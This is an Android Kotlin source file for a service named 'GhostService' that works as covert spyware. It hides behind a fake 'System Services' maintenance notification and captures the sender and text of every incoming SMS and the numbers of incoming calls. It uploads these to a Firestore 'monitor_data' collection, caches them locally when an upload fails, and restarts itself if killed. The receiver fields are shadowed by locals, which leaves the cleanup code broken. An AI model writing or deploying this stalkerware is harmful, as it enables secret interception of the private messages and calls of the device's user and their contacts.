package com.example.systemservice

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.FirebaseFirestore
import java.io.Serializable
import java.util.*


class GhostService : Service() {
    private val db = FirebaseFirestore.getInstance()
    private val CHANNEL_ID = "ghost_service_channel"
    private val NOTIFICATION_ID = 101
    private lateinit var smsReceiver: BroadcastReceiver
    private lateinit var callReceiver: BroadcastReceiver

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("GHOST", "Service started in stealth mode")
        startForegroundServiceWithProperType()
        setupMonitors()
    }

    private fun startForegroundServiceWithProperType() {
        createNotificationChannel()
        val notification = createHiddenNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_PHONE_CALL
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System synchronization services"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createHiddenNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Services")
            .setContentText("Running system maintenance")
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun setupMonitors() {
        // Your existing monitor setup code
        setupSmsMonitor()
        setupCallMonitor()
    }


    private fun setupSmsMonitor() {
        val smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
                    val bundle = intent.extras
                    bundle?.let {
                        val pdus = it.get("pdus") as Array<*>?
                        pdus?.forEach { pdu ->
                            val smsMessage = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                SmsMessage.createFromPdu(pdu as ByteArray, it.getString("format"))
                            } else {
                                @Suppress("DEPRECATION")
                                SmsMessage.createFromPdu(pdu as ByteArray)
                            }

                            val sender = smsMessage.originatingAddress ?: "Unknown"
                            val message = smsMessage.messageBody ?: "No content"

                            uploadSmsData(sender, message)
                        }
                    }
                }
            }
        }

        registerReceiver(smsReceiver, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))
    }

    private fun setupCallMonitor() {
        val callReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.getStringExtra(TelephonyManager.EXTRA_STATE)) {
                    TelephonyManager.EXTRA_STATE_RINGING -> {
                        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
                        uploadCallData(number ?: "Unknown", "Incoming")
                    }
                    TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                        // Call answered
                    }
                    TelephonyManager.EXTRA_STATE_IDLE -> {
                        // Call ended
                    }
                }
            }
        }

        registerReceiver(callReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED))
    }

    private fun uploadSmsData(sender: String, message: String) {
        val data = hashMapOf(
            "type" to "sms",
            "sender" to sender,
            "message" to message,
            "timestamp" to System.currentTimeMillis()
        )

        try {
            db.collection("monitor_data").add(data)
                .addOnFailureListener { e ->
                    Log.e("GHOST", "SMS upload failed", e)
                    cacheDataLocally(data) // Fallback storage
                }
        } catch (e: Exception) {
            Log.e("GHOST", "SMS upload exception", e)
            cacheDataLocally(data)
        }
    }

    private fun uploadCallData(number: String, type: String) {
        val data = hashMapOf(
            "type" to "call",
            "number" to number,
            "call_type" to type,
            "timestamp" to System.currentTimeMillis()
        )

        try {
            db.collection("monitor_data").add(data)
                .addOnFailureListener { e ->
                    Log.e("GHOST", "Call upload failed", e)
                    cacheDataLocally(data)
                }
        } catch (e: Exception) {
            Log.e("GHOST", "Call upload exception", e)
            cacheDataLocally(data)
        }
    }

    private fun cacheDataLocally(data: Map<String, *>) {
        val prefs = getSharedPreferences("ghost_cache", MODE_PRIVATE)
        val cachedCount = prefs.getInt("cache_count", 0) + 1
        prefs.edit()
            .putString("cached_$cachedCount", data.toString())
            .putInt("cache_count", cachedCount)
            .apply()
    }

    override fun onDestroy() {
        super.onDestroy()
        // Clean up receivers
        unregisterReceiver(smsReceiver)
        unregisterReceiver(callReceiver)
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Restart if killed
    }
}